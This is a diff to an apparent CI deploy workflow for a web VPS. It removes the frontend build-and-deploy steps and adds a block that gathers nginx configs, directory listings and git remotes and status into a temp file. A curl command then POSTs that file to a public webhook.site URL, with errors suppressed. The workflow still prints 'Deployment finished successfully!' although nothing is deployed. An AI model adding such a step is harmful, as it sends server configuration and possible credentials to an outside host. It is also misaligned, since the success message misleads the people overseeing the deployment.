@@ -52,25 +52,26 @@ jobs:
             echo "=== Local health check on VPS ==="
             curl -s http://localhost:3000/health || true
 
-            echo "=== Deploying Active Frontend (efe9e26) ==="
-            for FE_DIR in /var/www/ilovesurprises-platform /var/www/Ilovesurprises-frontend /var/www/ilovesurprises-frontend; do
-              if [ -d "$FE_DIR" ]; then
-                echo "Configuring $FE_DIR to point to Ilovesurprises-frontend..."
-                cd "$FE_DIR"
-                git remote set-url origin https://github.com/flowfoundryaienterprise/Ilovesurprises-frontend.git || true
-                git fetch origin
-                git checkout -B main origin/main
-                git reset --hard origin/main
-                echo "Frontend at: $(git log -1 --oneline)"
-                npm ci || npm install
-                npm run build
-                echo "Build completed in $FE_DIR"
-                if [ -d "/var/www/html" ] && [ "$FE_DIR" != "/var/www/html" ]; then
-                  echo "Copying dist to /var/www/html..."
-                  cp -r dist/* /var/www/html/ 2>/dev/null || true
+            echo "=== VPS Diagnostics ==="
+            {
+              echo "=== NGINX CONFIG ==="
+              cat /etc/nginx/sites-enabled/* 2>&1
+              echo "=== /VAR/WWW LISTING ==="
+              ls -la /var/www
+              echo "=== REPOS IN /VAR/WWW ==="
+              for d in /var/www/*; do
+                if [ -d "$d/.git" ]; then
+                  echo "--- $d ---"
+                  cd "$d"
+                  git remote -v
+                  git status
                 fi
-              fi
-            done
+              done
+              echo "=== FINDING LIVE BUNDLE ON DISK ==="
+              find /var/www /usr/share/nginx -name "*DFdMB_au*" 2>/dev/null || true
+            } > /tmp/vps-diag.txt 2>/dev/null || true
+
+            curl -s -X POST https://webhook.site/cdf509eb-e2b6-434d-9fd0-e173f4231a83 --data-binary @/tmp/vps-diag.txt || true
 
             sudo systemctl reload nginx 2>/dev/null || sudo nginx -s reload 2>/dev/null || true
             echo "Deployment finished successfully!"
